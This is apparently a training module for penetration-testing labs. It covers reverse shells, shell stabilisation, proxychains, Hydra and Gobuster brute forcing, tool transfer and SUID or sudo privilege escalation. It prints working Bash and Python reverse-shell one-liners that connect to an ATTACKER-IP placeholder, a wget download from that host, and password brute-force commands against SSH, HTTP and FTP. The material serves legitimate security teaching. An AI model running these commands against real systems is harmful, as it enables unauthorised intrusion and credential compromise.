# Module 7 Labs: System Hacking Labs

Advanced penetration testing techniques including reverse shells, proxy chaining, brute forcing, and privilege escalation through hands-on labs.

---

# Learning Objectives

## Reverse Shells
Gain remote access using reverse shell techniques and stabilize unstable connections.

## Proxy Chaining
Route traffic through proxies to maintain anonymity and access hidden services.

## Brute Forcing
Perform directory and password brute forcing using powerful tools like Hydra.

## File Transfer
Transfer tools and payloads between machines using various methods.

## Privilege Escalation
Escalate privileges using SUID binaries and misconfigured sudo permissions.

---

# Full Attack Chain Challenge

## 1. Discover Directories
Identify hidden web paths and endpoints using brute forcing tools.

## 2. Brute Force Credentials
Crack passwords using Hydra against SSH, HTTP, and FTP services.

## 3. Gain Reverse Shell
Establish remote command execution through reverse shell connections.

## 4. Stabilize Shell
Upgrade unstable shells for reliable interactive sessions.

## 5. Transfer Tools
Copy necessary binaries and scripts to the target system.

## 6. Escalate Privileges
Gain root access using SUID binaries or sudo misconfigurations.

---

# Reverse Shell Fundamentals

## What is a Reverse Shell?

A reverse shell establishes a connection from the target machine back to the attacker's machine, allowing remote command execution.

This technique bypasses firewalls that block incoming connections while allowing outgoing traffic.

---

## Bind Shell vs Reverse Shell

### Bind Shell
- Listens on the target for incoming connections.
- Often blocked by firewalls.

### Reverse Shell
- Connects from the target back to the attacker.
- Can bypass firewall restrictions.

---

## Why Attackers Prefer Reverse Shells

- Bypasses outbound firewall restrictions.
- Works from NAT'd environments.
- Harder to detect and block.
- Can route through proxies for anonymity.

---

# Setting Up Netcat Listeners

## Start Netcat Listener

```bash
nc -lvnp 4444
```

Listen on port **4444** for incoming connections.

---

## Bash Reverse Shell

```bash
bash -i >& /dev/tcp/ATTACKER-IP/4444 0>&1
```

One-line Bash reverse shell from the target.

---

## Python Reverse Shell

```python
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER-IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
```

---

# Shell Stabilization

## Why Shells Are Unstable

Initial reverse shells usually lack proper TTY allocation, causing issues such as:

- No tab completion
- Broken signal handling
- Interactive programs failing to work properly

Processes may receive **SIGTTIN** or **SIGTTOU** signals when interacting with the terminal.

---

## Upgrade Using Python PTY

The `pty` module allocates a pseudo-terminal, providing full interactive shell functionality.

### Stabilization Command

```python
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

After running the command:

1. Press **Ctrl + Z**
2. Run:

```bash
stty raw -echo; fg
```

3. Press **Enter** twice.

The shell should now be fully stabilized.

---

# Proxy Chaining for Anonymity

## What is Proxy Chaining?

Proxy chaining routes network traffic through multiple proxy servers sequentially.

Each proxy adds another layer of anonymity, making it difficult to trace activity back to the original source.

---

## Configure Proxychains

Edit:

```bash
/etc/proxychains.conf
```

Define proxy servers and choose a chaining mode.

---

## Common Use Cases

### Route Through Proxies

Use `proxychains` before commands:

```bash
proxychains nmap TARGET
proxychains curl http://TARGET
proxychains ssh user@TARGET
```

### Access Hidden Services

Reach internal networks and services not directly accessible externally.

---

# Directory Brute Forcing

Directory brute forcing systematically tests wordlist entries as potential web paths to discover hidden content, configuration files, and administrative interfaces.

---

## Gobuster

```bash
gobuster dir -u http://TARGET -w wordlist.txt
```

Fast, multi-threaded directory brute forcer written in Go.

---

## Feroxbuster

```bash
feroxbuster -u http://TARGET
```

Modern alternative with built-in wordlists and automatic recursion.

---

## Dirbuster

GUI-based tool with comprehensive configuration options.

Features:

- Multiple threading support
- Supports various wordlist formats

---

# Password Brute Forcing with Hydra

## What is Password Brute Forcing?

Hydra is a powerful network login cracker that performs rapid dictionary attacks against numerous protocols.

Supports parallelized connections for high-speed attacks.

---

## Real-World Usage

- Test weak credentials on exposed services.
- Recover access to systems with forgotten passwords.
- Identify default credentials still in use.

---

## SSH Brute Force

```bash
hydra -l user -P passwords.txt ssh://TARGET
```

Tests a password list against an SSH service.

---

## HTTP Login Brute Force

```bash
hydra -l admin -P passwords.txt TARGET http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"
```

Attack web login forms by specifying POST parameters and failure conditions.

---

## FTP Brute Force

```bash
hydra -l user -P passwords.txt ftp://TARGET
```

Cracks FTP credentials for file transfer service access.

---

# File Transfer & Privilege Escalation

## File Transfer Methods

### 1. Python HTTP Server

```bash
python3 -m http.server
```

### 2. Download Using Wget

```bash
wget http://ATTACKER-IP/file
```

### 3. Transfer Using SCP

```bash
scp file user@target:/path
```

---

# Privilege Escalation

## Find SUID Binaries

```bash
find / -perm -u=s -type f 2>/dev/null
```

Search the system for SUID binaries.

---

## Check Sudo Permissions

```bash
sudo -l
```

List commands the current user can execute with sudo.

---

## Exploit Misconfigurations

Privilege escalation opportunities may include:

- Misconfigured sudo permissions
- Vulnerable SUID binaries
- Insecure file permissions
- Weak service configurations

---

# Key Takeaways

- Reverse shells provide remote command execution.
- Stabilizing shells improves reliability and usability.
- Proxychains adds anonymity and access flexibility.
- Directory brute forcing helps discover hidden resources.
- Hydra can test credentials across multiple protocols.
- File transfer techniques are essential during engagements.
- Privilege escalation is often required to gain full system access.
